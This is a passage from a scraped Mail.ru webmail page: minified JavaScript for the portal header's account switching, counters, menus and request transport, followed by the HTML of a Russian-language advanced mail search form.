c&&c()}void 0==b&&(b={});var f=this.listeners(a);if(f)for(var f=f.slice(),a=new v.Event(a,b),i=f.length,b=0,l=i;b<l;b++){var k=f[b];if("function"===typeof k)try{k.call(this,a,e)}catch(j){e()}}else c&&c()},listeners:function(a){return this._events&&this._events[a]&&this._events[a].length&&this._events[a]},addListener:function(a,b){if("function"!==typeof b)throw Error("invalid argument");this._events||(this._events={});this._events[a]||(this._events[a]=[]);this._events[a].push(b);this.emit("newlistener",
{type:a});return this},once:function(a,b){function c(){this.removeListener(a,c);b.apply(this,arguments)}if("function"!==typeof b)throw Error("invalid argument");this.on(a,c);return this},removeListener:function(a,d){if("function"!==typeof d)throw Error("invalid argument");if(!this._events[a])return this;var c=this._events[a],e=b.ArrayIndexOf(c,d);if(0>e)return this;c.splice(e,1);0===c.length&&delete this._events[a];return this}};v.prototype.on=v.prototype.addListener;v.Event=function(a,b){this.type=
a;this.data=b};v.relay=function(a,b,c){for(var e=0,f=a.length;e<f;e++){var i=a[e];b.on(i,function(a){return function(){c.emit(a)}}(i))}};b.EventEmitter=v;(function(){function a(){var a=d();a.id++;id=a.id;4095<id&&(id=0);g(id);a=d();return a.id}function d(){var a=h.getGlobal(r),b;if(!a)return g(0,0,{id:0,current:0}),{id:0,current:0};b=parseInt(a.substr(0,3),16);a=parseInt(a.substr(3,6),16);return{id:b,current:a}}function g(a,b,c){(c=c||d())||(c={});void 0!==a&&(c.id=a);c.id=void 0!=c.id&&c.id.toString(16);
switch(c.id.length){case 1:c.id="00"+c.id;break;case 2:c.id="0"+c.id}void 0!==b&&(c.current=b);c.current=void 0!=c.current&&c.current.toString(16);switch(c.current.length){case 1:c.current="00"+c.current;break;case 2:c.current="0"+c.current}h.setGlobal(r,c.id+c.current)}function e(a,e){function j(a){l!==a&&(l=a,c.emit("visibilitychange",{hidden:a,visible:!a}))}var h;if(e)h=e.hidden,j(h);else if(h="focus"==a.type||"focusin"==a.type?!1:"blur"==a.type||"focusout"==a.type?!0:!!document[f],"focusout"==
a.type)i=b.setTimeout(function(){i=void 0;j(h)},0);else if("focusin"==a.type)void 0!==i?b.clearTimeout(i):j(h),i=void 0;else if((n||p)&&!k)if(h)i=b.setTimeout(function(){i=void 0;try{d().current===q||j(h)}catch(a){b.radar("cookieError",1)}},200);else{try{d().current!==q&&(g(void 0,q),j(h))}catch(m){b.radar("cookieError",1)}b.clearTimeout(i);i=void 0}else j(h)}var f,i,l=!1,k,j={hidden:"visibilitychange",mozHidden:"mozvisibilitychange",webkitHidden:"webkitvisibilitychange",msHidden:"msvisibilitychange",
oHidden:"ovisibilitychange"};for(f in j)if(j.hasOwnProperty(f)&&f in document){k=j[f];break}var j=navigator.userAgent,m=-1<j.indexOf("iPad")||-1<j.indexOf("iPhone")||-1<j.indexOf("iPod"),n=!k&&-1<j.indexOf("Opera"),p=0<j.indexOf("Safari")&&-1===j.indexOf("Chrome"),r="t";try{if((n||m||p)&&!k){var q=a();g(void 0,q)}}catch(u){b.radar("cookieError",1)}if(k)b.event(1,document,k,e);else if(window.eval&&eval("/*@cc_on!@*/false"))b.event(1,document,"focusin",e),b.event(1,document,"focusout",e);else if(m){var s=
new Date,t=function(){b.clearTimeout(50);b.setTimeout(t,50);var a=new Date;100<a.getTime()-s.getTime()&&d().current!==q&&(g(void 0,q),l=!1,e({},{hidden:!0}),l=!0,e({},{hidden:!1}));s=a};b.setTimeout(t,50)}else b.event(1,window,"focus",e),b.event(1,window,"blur",e)})();J.prototype={visibleClass:"x-ph__link_ext",show:function(){b.addClass(this._container,this.visibleClass);b.clearTimeout(this._animTimeout);b.clearTimeout(this._animResetTimeout);this._anim&&this._isAnim&&(this._animTimeout=b.setTimeout(function(){b.addClass(this._node,
"x-ph-animated_flash");this._animResetTimeout=b.setTimeout(function(){b.removeClass(this._node,"x-ph-animated_flash")}.bind(this),1E3)}.bind(this),100))},hide:function(){b.removeClass(this._container,this.visibleClass)},value:function(a){void 0!==a&&(this._node.innerHTML=this.prepare(a));return parseInt(this._node.innerHTML,10)||void 0},prepare:function(a){a=parseInt(a);return 0<a?a:0},update:function(a){var d=this.value();b.clearTimeout(this._updateTimeout);this._updateTimeout=b.setTimeout(function(){a=
this.value(a);if(void 0!==d&&a>d||c.activeUser()!=this._isAnim)this._anim=!0;this[a?"show":"hide"]();this._anim=!1}.bind(this),100)}};b.Couners=na;b.Couner=J;p.__all=[];p.resetShowOnInit=function(a){for(var b=0,c=p.__all.length;b<c;b++){var e=p.__all[b];if(!a||e!==a)e._triggerShowOnInit=!1,e._triggerHideOnInit=!1}};p.hideAll=function(){for(var a=0,b=p.__all.length;a<b;a++){var c=p.__all[a];c._triggerShowOnInit=!1;c._triggerHideOnInit=!1;c.hide()}};b.extend(p.prototype,b.EventEmitter.prototype,{init:function(a){!this._dropdown&&
a&&(this._dropdown=a,this._rootNode.appendChild(a),this._inited=!0,this._triggerShowOnInit&&this.show(),this._triggerHideOnInit&&this.hide(),this._triggerHideOnInit=this._triggerShowOnInit=!1)},_mouseIn:function(){b.clearTimeout(this._hideTimeout)},_mouseOut:function(){b.clearTimeout(this._hideTimeout);this._hideTimeout=b.setTimeout(b.bind(this.hide,this),4E3)},isVisible:function(){return b.hasClass(this._rootNode,this._openClass)},show:function(a){b.clearTimeout(this._hideTimeout);a&&b.eventPreventDefault(a);
this._inited?this.isVisible()||this.emit("show",{},b.bind(function(){this.__toggle(!0)},this)):(this._triggerShowOnInit=!0,p.resetShowOnInit(this))},hide:function(){this._inited?this.isVisible()&&this.emit("hide",{},b.bind(function(){this.__toggle(!1)},this)):this._triggerShowOnInit?this._triggerShowOnInit=!1:this._triggerHideOnInit=!0},_hideOther:function(){for(var a=0,b=p.__all.length;a<b;a++){var c=p.__all[a];c!=this&&c.isVisible()&&c.hide();c._triggerShowOnInit=!1}},_click:function(a){var c=a.target||
a.srcElement;c==this._dropdown||b.hasParent(c,this._dropdown)?this.emit("click",{clickEvent:a},b.bind(this.hide,this)):"click"==a.type&&(b.hasParent(c,this._rootNode)&&b.eventPreventDefault(a),this.hide())},_open:function(){b.clearTimeout(this._openTimeout);this._openTimeout=b.setTimeout(b.bind(function(){if(this._orientation)b.addClass(this._rootNode,this._openClass),b.addClass(this._rootNode,this["_"+this._orientation+"Class"]);else{var a=this._dropdown.clientWidth,c=this._rootNode.offsetLeft,g=
a+(this._rootNode.offsetParent==b.rootNode?c:1E4),e=document.body.offsetWidth;b.addClass(this._rootNode,this._openClass);b.removeClass(this._rootNode,g<=e?this._rightClass:this._leftClass);b.addClass(this._rootNode,g>e?this._rightClass:this._leftClass);this._dropdown.style.right=c+this._rootNode.clientWidth<a&&g>e?-(a-(c+this._rootNode.clientWidth)+10)+"px":""}a=b.bind(function(){window.webkitURL&&(this._dropdown.style.width=this._dropdown.clientWidth+1+"px",this._dropdown.style.width=null)},this);
a();b.setTimeout(a,0)},this),0)},__toggle:function(a){b.clearTimeout(this.__eventsTimeout);this.__eventsTimeout=b.setTimeout(b.bind(function(){b.event(a,document,"click",this.__click||(this.__click=b.bind(this._click,this)));b.event(a,this._rootNode,"mouseout",this.__mouseOut||(this.__mouseOut=b.bind(this._mouseOut,this)));b.event(a,this._rootNode,"mouseover",this.__mouseIn||(this.__mouseIn=b.bind(this._mouseIn,this)))},this),10);a?(this._openCounter&&b.count(this._openCounter),"block"!==this._dropdown.style.display&&
(this._dropdown.style.display="block"),this._open(),b.event(1,window,"resize",this._open)):(b.removeClass(this._rootNode,this._openClass),b.removeClass(this._rootNode,this._leftClass),b.removeClass(this._rootNode,this._rightClass),b.event(0,window,"resize",this._open))}});b.Menu=p;var Y=document.getElementsByTagName("head")[0];q.prototype={get:function(a){a=b.extend({encoding:this._encoding,params:{},complete:function(){}},a);this.cancel();return this[this._isXHR2()?"_getXHR":"_getScript"](this._url,
a)},_isXHR2:function(){return this._xhrEnabled&&this._xhr2Supported},_getUrl:function(a,b){var c=!!~a.indexOf("?");b.rnd=(new Date).getTime();for(var e in b)if(b.hasOwnProperty(e)){var f=b[e];"function"==typeof f&&(f=f(b));void 0!==f&&(a+=(c?"&":"?")+e+"="+encodeURIComponent(f),c=!0)}return a},_getXHR:function(a,c){var g=new XMLHttpRequest;g.onreadystatechange=b.bind(function(){if(this._processing){var a;if(4===g.readyState){b.clearTimeout(this._xhrTimeout);this._processing=!1;if(200==g.status){var f;
try{f=b.parseJson(g.responseText)}catch(i){a=i}}!a&&200==g.status?(a=f,a.error&&!a.errorType&&(a.errorType="serverError")):a=a?{status:"error",errorType:"parseError"}:200!=g.status?{status:"error",errorType:"netError"}:{status:"error"};this._requestSource&&(a.requestSource=this._requestSource);c.complete(a)}}},this);this._processing=!0;b.clearTimeout(this._xhrTimeout);c.timeout&&(this._xhrTimeout=b.setTimeout(b.bind(function(){this._processing&&(b.clearTimeout(this._xhrTimeout),this._processing=!1,
this.cancel(),c.complete({status:"error",errorType:"timeout"}))},this),c.timeout));g.open("get",this._getUrl(a,c.params),!0);g.withCredentials=!0;g.send(null);this._xhr=g},_getScript:function(a,c){function g(){Y.appendChild(f);b.setTimeout(function(){Y.removeChild(f)},6E4)}var e=this._cbName="__PHJSONPCallback_"+q.getUuid(),f=document.createElement("script"),i,h=c.timeout;c.params[this._JSONPCallbackParam]=e;a=this._getUrl(a,c.params);window[e]=b.bind(function(a){b.clearTimeout(i);window[e]=q.__PHEmptyCallback;
this._cbName=null;this._processing=!1;this._requestSource&&(a.requestSource=this._requestSource);a.error&&!a.errorType&&(a.errorType="serverError");"cancel"!=a.status&&c.complete(a)},this);f.defer="defer";f.async="async";f.type="text/javascript";c.nonce&&f.addAtribute("nonce",c.nonce);c.encoding&&(f.charset=c.encoding);f.src=a;!("opera"in window)||"complete"===document.readyState?(this._processing=!0,g()):window.addEventListener("DOMContentLoaded",b.bind(function(){this._processing=!0;g()},this),
!1);h&&(i=b.setTimeout(b.bind(function(){window[this._cbName]({status:"error",errorType:"timeout"})},this),h))},isProcessing:function(){return this._processing},cancel:function(){this._isXHR2()?this._cancelXHR():this._cancelScript()},_cancelXHR:function(){this._xhr&&this._xhr.abort()},_cancelScript:function(){this._cbName&&window[this._cbName]&&window[this._cbName]({status:"cancel"})}};q.__uuid=0;q.getUuid=function(){return q.__uuid++};q.__PHEmptyCallback=function(){};b.extend(b,{Transport:q});b.AccountManager=
oa;b.extend(b.AccountManager.prototype,b.EventEmitter.prototype,{activeUser:function(){return this._user},updateLogin:function(a,b){this._user=a;this._userEmail.innerHTML=this.drawName(a,b);a?(this._noAuthView.style.display="none",this._authView.style.display=""):(this._authView.style.display="none",this._noAuthView.style.display="")},isCorp:b.isCorp,isCorpCookie:b.isCorpCookie,setCorp:function(a){for(var c=0,g=a.length;c<g;c++)if("corp.mail.ru"===a[c].split("@")[1])return b.SCookie.setGlobal(this.isCorpCookie,
(new Date).getTime()),!0;if((a=b.SCookie.getGlobal(this.isCorpCookie))&&(new Date).getTime()>1*a+864E5)return b.SCookie.removeGlobal(this.isCorpCookie),!1},drawName:function(a,b){return"string"!=typeof b?a:['<i class="x-ph__menu__button__text__icon x-ph-ico x-ph-ico_',this.getSocialInfo(a).id,'"></i>&nbsp;',b].join("")},getSocialInfo:function(a){var a=a.match(/^[0-9]+@(vk|ok|fb)$/),c={ok:b.translations&&b.translations.ok,vk:b.translations&&b.translations.vk,fb:"Facebook"};return null==a?void 0:{id:a[1],
name:c[a[1]]}}});var Z=!1,E=b.byId("ph_mail"),F=b.byId("ph_my");b.extend(b.AccountManager.prototype,{updateLinks:function(a){E.href=E.href.split("?")[0];var d=[];c.settings.siteid&&!a.email&&d.push("siteid="+c.settings.siteid);"mail"===b.project&&d.push("lang="+c.settings.lang);a.email||d.push("_1ld=1_1000043_1000475_0");d.length&&(E.href=E.href+"?"+d.join("&"));F.href=F.href.split("?")[0];d=[];a.email||d.push("_1ld=1_1000006_1000476_0");d.length&&(F.href=F.href+"?"+d.join("&"))},updateCounters:function(a){var d=
{},a=a||{};if("mail"!=b.project&&!("home"==b.project&&c.settings.mailSplashUpdate)||!Z&&"mail"==b.project&&!c.settings.mailEvents)d.mail=a.mail_cnt||0;Z=!0;d.my=a.my_cnt||0;c.settings.disableGamesCounter||(d.games=a.games_cnt||0);this.updateNotifier(a);b.counters.update(d)},updateNotifier:function(a){var c=b.byId("PH_authMenu"),a=a.mail_notifier?parseInt(a.mail_notifier,10):0;b[(0==a?"remove":"add")+"Class"](c,"x-ph__menu_auth_unread")},_sendError:function(a){var d={updateError:1},g={rlog:"navidata_errors",
email:c.activeUser(),rlog_message:[]};a.errorType&&(d["updateError_"+a.errorType]=1,g.rlog_message.push(a.errorType));a.requestSource&&(d["updateError_"+a.requestSource]=1,g.rlog_message.push(a.requestSource),a.errorType&&(d["updateError_"+a.errorType+"_"+a.requestSource]=1,g.rlog_message.push(a.errorType)));b.radar(d,g);this.emit("updateError")},_PHUpdater:function(a,d,g){function e(a){this.updateLinks(i);"ok"!=b.project&&c.settings.portalAuthEnabled&&this.updateLogin(k,m);this.updateCounters(i);
"function"===typeof a&&a()}var d=d||function(){},f=a.status;if("error"==f)this._sendError(a),d();else{var i=a.data,h=i.action,k=i.email,j=b.bind(e,this),m="undefined"!==typeof i.soc_name?i.soc_name:void 0;this.setCorp(i.list||[]);c.settings.portalAuthEnabled?"switch"==h?"disabled"==f?g?(b.radar({disabledUser:1,disabledUserRestore:1}),d()):(this.emit("disabledUser"),c.emit("disabledUser",a.data,function(){b.radar({disabledUser:1,disabledUserSendToLogin:1});window.location="https://e.mail.ru/login?fail=1&d1&page="+
encodeURIComponent(location.href)+"&email="+encodeURIComponent(k)})):"ok"==f&&k!=this.activeUser()?(this.emit("authChange"),c.listeners("authChange")?(b.radar("authChange",1),!k||void 0!==i.mail_cnt?c.emit("authChange",a.data,function(){j(d)}):this.loadAccountInfo(b.bind(function(a){"error"==a.status?(this._sendError(a),d()):(i=b.extend(a.data,i),c.emit("authChange",i,function(){j(d)}))},this),k)):g?(b.radar("authChangeReloadDis",1),!k||void 0!==i.mail_cnt?j(d):this.loadAccountInfo(b.bind(function(a){"error"==
a.status?(this._sendError(a),d()):(i=b.extend(a.data,i),j(d))},this),k)):(b.radar("authChangeReload",1),b.setTimeout(function(){location.reload()},10))):"noauth"==f&&k!=this.activeUser()?("home"===b.project&&(f=[],f.push("headlineAuthLost"),f.push("mpop="+(c.cookie("Mpop")?"1":"0")),f.push("activeEmail="+this.activeUser()),f.push("newEmail="+k),(new Image).src="//gstat.imgsmail.ru/gstat?ua=1&logme="+encodeURIComponent(f.join(";"))+"&rnd="+(new Date).getTime()+Math.random()),b.radar("authLost",1),
this.emit("authLost"),c.emit("authLost",a.data,b.bind(function(){a.status="ok";a.data.action="switch";this._PHUpdater(a,d,g)},this))):(b.radar("authRestore",1),"function"===typeof d&&d()):"list"==h&&("____user"in this&&(this.____user!==k&&"mail"===b.project&&((new Image).src="//gstat.imgsmail.ru/gstat?logme="+encodeURIComponent("headlineFail;headlineEmail="+k+";projectEmail="+this.____user)+"&rnd="+(new Date).getTime()+Math.random(),h={userMismatch:1},h["userMismatch_"+(k?"":"no")+"HeadlineUser"]=
1,h["userMismatch_"+(this.____user?"":"no")+"ProjectUser"]=1,h["userMismatch_"+(this.____user?"":"no")+"PUser_"+(k?"":"no")+"HUser"]=1,b.radar(h)),delete this.____user),null===this.activeUser()?(c.settings.enableUpdateRadars&&b.radar("update",1),this.emit("update"),c.emit("update",a.data,function(){j(d)})):k==this.activeUser()?((h=c.cookie("Mpop"))&&("ok"==f&&this.activeUser()&&-1==h.indexOf(this.activeUser()))&&b.count("d1409289"),c.settings.enableUpdateRadars&&b.radar("update",1),this.emit("update"),
c.emit("update",a.data,function(){j(d)})):(a.data.action="switch",this._PHUpdater(a,d,!0))):(c.settings.enableUpdateRadars&&b.radar("update",1),this.emit("update"),c.emit("update",a.data,function(){j(d)}))}}});b.extend(b.AccountManager.prototype,{_authTransport:new b.Transport(c.settings.authDomain+"/cgi-bin/auth?mac=1",{JSONPCallbackParam:"JSONP_call",xhrEnabled:!0,requestSource:"auth"}),switchAccount:function(a,c,g){var e={};if(a){e.Login=a;var f=this.updateResume(c||function(){});this._authTransport.get({params:e,
complete:b.bind(function(a){this._PHUpdater(a,f,g)},this),timeout:3E4})}},_logoutTransport:new b.Transport(c.settings.authDomain+"/cgi-bin/logout?mac=1",{JSONPCallbackParam:"JSONP_call",xhrEnabled:!0,requestSource:"logout"}),logoutAccount:function(a,b){var c={};if(a&&a!==this.activeUser())c.Login=a;else throw Error("Can not logout. Not active account expected.");this._logoutTransport.get({params:c,complete:b})}});var L=!1,$;b.extend(b.AccountManager.prototype,{_accountInfoTransport:new b.Transport(c.settings.swaDomain+
"/NaviData?mac=1&gamescnt=1&Socials=1",{JSONPCallbackParam:"JSONP_call",xhrEnabled:!0,requestSource:"accountInfo"}),loadAccountInfo:function(a,b){var g={};if(b=!c.settings.multiAuthEnabled?void 0:b||this.activeUser())g.Login=b;this._accountInfoTransport.get({params:g,complete:function(b){"function"===typeof a&&a(b)},timeout:3E4})},updateAccountInfo:function(a,c){if(!L){var g=+new Date;if(this._updateByTimeout||!this._updateByTimeout&&this.updateLastRequest<g-this.updateRequestTimeout||c)!this._updateByTimeout&&
this.updateLastRequest&&((new Image).src="//rs.mail.ru/d"+"532246".replace("%","")+".gif?"+g),this.updateLastRequest=g,g=this.updateResume(b.bind(function(b){this._PHUpdater(b,a)},this)),this.loadAccountInfo(g)}},updateRequestTimeout:6E4,updateReset:function(a){this._updateByTimeout&&(a?(a=this.updateRequestTimeout-(new Date).getTime()+this.updateLastRequest,0>a&&(a=0)):a=this.updateRequestTimeout,b.clearTimeout(this._listAccountTimeout),this._listAccountTimeout=b.setTimeout(b.bind(this.updateAccountInfo,
this),a))},updateResume:function(a){if(this._updateByTimeout){var c=this._accountInfoTransport.isProcessing();this._accountInfoTransport.cancel();this.updateReset();var g=!1;this.once("authChange",function(a,b){g=!0;"function"===typeof b&&b()})}return b.bind(function(b){this._updateByTimeout&&(c?g?this.updateReset():this.updateAccountInfo():g?this.updateReset():this.updateReset(!0));"function"==typeof a&&a(b)},this)},pauseUpdate:function(a,b){a?$=setTimeout(function(){L=!0},b):(clearTimeout($),L=
!1)}});if(c.settings.ZADblock)try{s=function(){};t=0;x="zEvalCode zDcd zSha1Cache zSha1 zInitLCAG zInitAG zInit zStarted zDomain zPid zUniID zSysDomain zSecSrvU zWSOnl zNoWS zWSE zTrID zSfID zBnID zIsSSL zDocLoc zinframe zdu zoKey zWsDoms zSysAdv zBlockCloner zStartIndexer zVideoSlider zMailPages zSysStartFilter zloadJS zAdv zSqListener zRender zChimg zChblkADB zChblk zStartFilter zisrch zisrchf zisrchok zInitVideoVast zVastRender zdea zdeg zCuVk zObj zRedirObj".split(" ");for(n=0;n<x.length;n++){var r=
x[n];if("object"==typeof window[r]){var y=window[r],m=void 0;for(m in y)"object"==typeof y[m]?y[m]={}:"function"==typeof y[m]&&(y[m]=s);t++}else"function"==typeof window[r]&&(window[r]=s)}t&&((new Image).src="//stat.radar.imgsmail.ru/update?p=splash&t=ZADBLOCK&v=1&i=all:1&rnd="+Math.random(),(new Image).src="//stat.radar.imgsmail.ru/update?p=splash&t=ZADBLOCKCOUNT&v="+t+"&i=all:"+t+"&rnd="+Math.random())}catch(xa){}b.SCookie.removeGlobal("s_mu");b.SCookie[(b.retina?"set":"remove")+"Global"]("rt",
1);b.SCookie[(b.retina?"set":"remove")+"Global"]("dpr",b.dpr);c.settings.enableUpdateRadars=b.percent(1);c.settings.authFormEnabled=c.settings.multiAuthEnabled=c.settings.portalAuthEnabled;r=!1;if(~navigator.userAgent.indexOf("Opera")&&(!~navigator.userAgent.indexOf("Opera/9.8")||~navigator.userAgent.indexOf("Version/10"))||window.____________ie7||window.____________ie6||~navigator.userAgent.indexOf("Firefox/3."))c.settings.multiAuthEnabled=!1,c.settings.authFormEnabled=!1,r=!0;b.byId("PH_singleuser").style.display=
c.settings.multiAuthEnabled?"none":"block";b.byId("PH_miltiuser").style.display=c.settings.multiAuthEnabled?"block":"none";c.settings.projectsMenuEnabled=!1;r||(c.settings.projectsMenuEnabled=!0,b.byId("PH_projectsMenu").style.display="inline-block",b.byId("PH_allProjects").style.display="none");c.settings.bizLinks&&(b.byId("PH_projectsMenu").style.display="none",b.byId("PH_allProjects").style.display="none");b.countEl(b.byId("PH_logoutLink"));b.countEl(b.byId("PH_loginLink")||b.byId("PH_authLink"));
b.extend(c,b.EventEmitter.prototype,{cookie:C});if(~navigator.userAgent.toLowerCase().indexOf("iphone")||~navigator.userAgent.toLowerCase().indexOf("ipad")||~navigator.userAgent.toLowerCase().indexOf("ipod")||~navigator.userAgent.toLowerCase().indexOf("android"))document.body.style.cursor="pointer";c.cookie.s={};b.extend(c.cookie.s,{getLocal:h.getLocal,setLocal:h.setLocal,removeLocal:h.removeLocal,getGlobal:h.getGlobal,setGlobal:h.setGlobal,removeGlobal:h.removeGlobal,setProject:h.setProject});var aa=
"mail"!==b.project;b.accountManager=new b.AccountManager({noAuthView:b.byId("PH_noAuthView"),authView:b.byId("PH_authView"),userEmail:b.byId(c.settings.multiAuthEnabled?"PH_user-email":"PH_user-email_disabled"),updateByTimeout:aa});b.counters=new b.Couners({mail:"g_mail_events",my:"g_my_events",ok:"g_ok_events",games:"g_games_events",love:"g_love_events"});c.updateCounter=function(a){"sting"===typeof a||"number"===typeof a||void 0===a||null===a?b.counters._counters[b.project]&&b.counters.update(b.project,
a):b.counters.update(a);aa||b.accountManager.updateAccountInfo()};"mail"==b.project&&window.jQuery&&window.jQuery(window).bind("updatemessagescount",function(a,b){c.updateCounter(b)});c.isMultiAuth=function(){return c.settings.multiAuthEnabled};c.activeUser=function(){if(c.settings.portalAuthEnabled){var a=b.accountManager.activeUser();return null===a?b.accountManager.____user:a}return b.byId("PH_user-email_disabled").innerHTML||void 0};c.settings.portalAuthEnabled&&(c.isCorp=function(){var a=c.activeUser();
return"corp.mail.ru"==(a&&a.split("@")[1])},c.switchAccount=function(a,c){b.accountManager.switchAccount(a,c)},c.logoutAccount=function(a,c){b.accountManager.logoutAccount(a,function(){b.accountManager.loadAccountsList(c)})});c.settings.multiAuthEnabled&&(c.loadAccountsList=(new b.DeferredQuery).getQuery(),c.on("visibilitychange",function(a){a.data.hidden?c.settings.pauseUpdate&&b.accountManager.pauseUpdate(!0,c.settings.pauseUpdateTime||36E5):(null!==b.accountManager.activeUser()&&b.accountManager.activeUser()?
b.accountManager.switchAccount(b.accountManager.activeUser(),null,!0):b.accountManager.updateAccountInfo(function(){},!0),c.settings.pauseUpdate&&b.accountManager.pauseUpdate())}));r=new b.Menu({baseClass:"x-ph__menu",orientation:"right",rootNode:b.byId("PH_authMenu"),button:b.byId("PH_authMenu_button"),openCounter:"home"==b.project?"d1126003":"mail"==b.project?"d1126002":"my"==b.project?"d1270901":"d1126005"});b.authMenu=r;c.authMenu=new b.EventEmitter;c.settings.multiAuthEnabled&&(c.authMenu.show=
b.bind(b.authMenu.show,b.authMenu),c.authMenu.hide=b.bind(b.authMenu.hide,b.authMenu));c.authForm=!c.settings.authGate?new b.EventEmitter:{};c.settings.authFormEnabled?(c.authForm.show=(new b.DeferredQuery).getQuery(),c.authForm.hide=(new b.DeferredQuery).getQuery()):(c.authForm.show=function(a){var c=[];a||(a={});a.login&&a.domain&&c.push("email="+a.login+"@"+a.domain);c.push("page="+encodeURIComponent(a.successPage?a.successPage:"mail"==b.project||"home"==b.project?"https://e.mail.ru/messages/inbox":
window.location.href));window.location="https://e.mail.ru/login?"+c.join("&")},c.authForm.hide=function(){});c.authForm.isVisible=function(){return b.authForm?b.authForm.isVisible():!1};b.authLinkClickHandler=function(a){c.listeners("loginRequest")?(b.eventPreventDefault(a),c.emit("loginRequest")):c.settings.authFormEnabled&&(b.eventPreventDefault(a),c.authForm.show())};b.event(1,b.byId("PH_authLink"),"click",b.authLinkClickHandler);b.registerLinkClickHandler=function(a){c.listeners("registerRequest")&&
(b.eventPreventDefault(a),c.authForm.hide(),c.emit("registerRequest"))};b.event(1,b.byId("PH_regLink"),"click",b.registerLinkClickHandler);c.isAuthFormEnabled=function(){return c.settings.authFormEnabled};b.projectsMenu=new b.Menu({baseClass:"x-ph__menu",rootNode:b.byId("PH_projectsMenu"),button:b.byId("PH_projectsMenu_button"),openCounter:"d521725"});if(c.settings.projectsMenuEnabled||c.settings.multiAuthEnabled||c.settings.authFormEnabled)c.settings.authGate&&U(c.settings.authGateJS+
"?"+1E17*Math.random()),U(c.settings.externalJS,!0);u.timeEnd("headline.inline.js")}})();

</script><!--/noindex-->







	




	
		<script>
(function (s) {
	s.noSuggests = true;
})(window.__PMS || (window.__PMS = {}));
</script>



<div style="height: 52px;" data-mnemo="portal-menu" id="portal-menu" class="portal-menu portal-menu_flat portal-menu_boxshadow-yes">
	<div class="pm-css-checker" id="pm-css-checker" style="display: none;"></div>
	<div class="w-pm-menu">
		<div class="portal-menu_width">
			<div class="pm-menu">
				<div class="pm-menu__left">
                    <div class="pm-menu__left__inner">
					<div bem-id="3" class="pm-logo" style="padding-left: 52px; padding-right: 0px;" data-config-id="0"><a class="pm-logo__link" href="//mail.ru/" style="width:135px"><img style="margin-top: 12px;" class="pm-logo__link__pic" src="https://img.imgsmail.ru/r/default/portal/0.1.29/logo.png" alt="Почта@Mail.Ru" title="Почта@Mail.Ru" height="28" width="135"></a></div>
                    </div>
				</div>
				<div class="pm-menu__center">
					<div class="pm-menu__center__inner">
						<i class="pm-menu__center__inner__leg">s</i>
					</div>
				</div>
			</div>
			
				
				<div id="popup_advanced-search" class="popup popup_search" style="display: none;">
					<a class="popup__close js-close"><i class="icon icon_popup-close"></i></a>
					

<form method="GET" action="/search/">
	
	<div class="popup__box">
		
		<div class="popup__head">
			Расширенный поиск
		</div>
		
		<div class="popup__fieldset">
			<div class="form__row form__row_narrow">
				<div class="form__row__label">
					<label for="from_popup">От кого</label>
				</div>
				<div class="form__row__widget">
					<div style="position:relative; width: 300px;">
						<input tabindex="1000" autofocus="true" style="width:300px;" class="form__field form__field_address-list js-ac-addressbook" id="from_popup" name="q_from" value="" type="text">
						
						<div class="form__field__suggest ac-layer">
							<span class="div_inner ac-items form__field__suggest__inner">
								<div class="form__field__suggest__item"></div>
							</span>
						</div>
						
					</div>
				</div>
			</div>
			<div class="form__row form__row_narrow">
				<div class="form__row__label">
					<label for="to_popup">Кому</label>
				</div>
				<div class="form__row__widget">
					<div style="position:relative; width: 300px;">
						<input tabindex="1001" style="width:300px;" class="form__field form__field_address-list js-ac-addressbook" id="to_popup" name="q_to" value="" type="text">
						
						<div class="form__field__suggest ac-layer">
							<span class="div_inner ac-items form__field__suggest__inner">
								<div class="form__field__suggest__item"></div>
							</span>
						</div>
						
					</div>
				</div>
			</div>
			<div class="form__row form__row_narrow">
				<div class="form__row__label">
					<label for="subj_popup">Тема</label>
				</div>
				<div id="adv-search-theme-name" class="form__row__widget">
					<div style="position:relative; width: 300px;">
						<input tabindex="1002" class="form__field js-input" id="subj_popup" name="q_subj" value="" type="text">
						
						<div class="js-suggest portal-menu__search__dropdown" style="display:none;">
							<div class="portal-menu__search__suggest portal-menu__search__suggest_adv-search">
								<div class="js-suggest-list portal-menu__search__suggest__inner"></div>
								<a cnt_sb="427956" class="js-suggest-internet-cont portal-menu__search__suggest__item" href="#" target="_blank">
									Найти <span class="js-suggest-internet portal-menu__search__suggest__item_internet-link"></span> в&nbsp;интернете
								</a>
							</div>
						</div>
						
					</div>
				</div>
			</div>
			<div class="form__row form__row_narrow">
				<div class="form__row__label">
					<label for="text_popup">Содержит слово</label>
				</div>
				<div id="adv-search-word-contain" class="form__row__widget">
					<div style="position:relative; width: 300px;">
						<input tabindex="1003" class="form__field js-input" id="text_popup" name="q_query" value="" type="text">
						
						<div class="js-suggest portal-menu__search__dropdown" style="display:none;">
							<div class="portal-menu__search__suggest portal-menu__search__suggest_adv-search">
								<div class="js-suggest-list portal-menu__search__suggest__inner"></div>
								<a cnt_sb="427956" class="js-suggest-internet-cont portal-menu__search__suggest__item" href="#" target="_blank">
									Найти <span class="js-suggest-internet portal-menu__search__suggest__item_internet-link"></span> в&nbsp;интернете
								</a>
							</div>
						</div>
						
					</div>
				</div>
			</div>

			
			<div class="form__row form__row_narrow">
				<div class="form__row__label">
					<label for="date-from_popup">Дата</label>
				</div>
				<div class="form__row__widget">

					<div class="form__field__wrapper form__field__wrapper_inline">
						<a href="#" class="form__field__calendar-link js-calendar-link"><i class="icon icon_form icon_form_calendar"></i></a>
						<input tabindex="1004" id="date-from_popup" name="q_date" value="" autocomplete="off" class="form__field form__field_date-field js-date-from" style="width:123px;" type="text">
						<div class="js-date-from-calendar"></div>
					</div>


					<div class="form__field__wrapper form__field__wrapper_inline">
						<div class="form__select" style="width:144px;">
							<div class="form__select__box"><div class="form__select__box__text js-text"></div></div>
							<i class="form__select__arrow"></i>
							<select tabindex="1005" name="q_date_lapse" class="form__select__select">
								<option value="0">точная дата</option>
								<option value="1">±1 день</option>
								<option value="3">±3 дня</option>
								<option value="7">±7 дней</option>
								<option value="30">±30 дней</option>
							</select>
						</div>
					</div>
				</div>
			</div>
			
			<div class="form__row form__row_narrow">
				<div class="form__row__label">

				</div>
				<div class="form__row__widget">
					<div class="form__checkbox"><label><input tabindex="1006" id="read" class="form__checkbox__checkbox" value="2" name="q_read" type="checkbox"><span class="form__checkbox__label">Непрочитанное</span></label></div>
					<div class="form__checkbox"><label><input tabindex="1007" id="flaged" class="form__checkbox__checkbox" value="2" name="q_flag" type="checkbox"><span class="form__checkbox__label">Отмеченное флажком <i class="ico ico_folder ico ico_folder_important" style="position: relative; top:2px;"></i></span></label></div>
